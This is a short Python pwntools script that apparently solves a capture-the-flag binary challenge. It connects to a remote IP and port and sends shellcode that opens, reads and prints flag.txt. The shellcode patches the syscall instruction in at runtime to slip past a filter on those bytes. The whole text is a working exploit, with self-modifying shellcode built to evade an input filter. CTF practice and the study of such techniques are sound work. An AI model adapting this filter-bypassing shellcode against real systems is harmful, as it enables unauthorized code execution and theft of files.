from pwn import *
from sys import *
elf = context.binary = ELF("./chall")
p = process("./chall")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
HOST = '103.152.242.37'
PORT = 40102
cmd = """
b*main+319
b*main+213
"""
# if(argv[1] == 'gdb'):
    # gdb.attach(p, cmd)
# elif(argv[1] == 'rm'):
p = remote(HOST, PORT)

syscall = u32(asm("syscall;nop;nop;"))
syscall_safe = "mov dword ptr [rip], r12d; nop;nop;nop;nop;"
sc = f"mov r12d, {~syscall}; xor r12d, 0xFFFFFFFF;"
sc += shellcraft.openat(-100, "./flag.txt", constants.O_RDONLY)
sc += shellcraft.read(0x5, 'rbx', 0x100)
sc += shellcraft.write(0x1, 'rbx', 0x100)
sc = sc.replace("syscall", syscall_safe)
print(len(asm(sc)))
sleep(1)
payload = asm("mov rbx, rdx")
payload += asm(sc)
p.send(payload)
p.interactive()
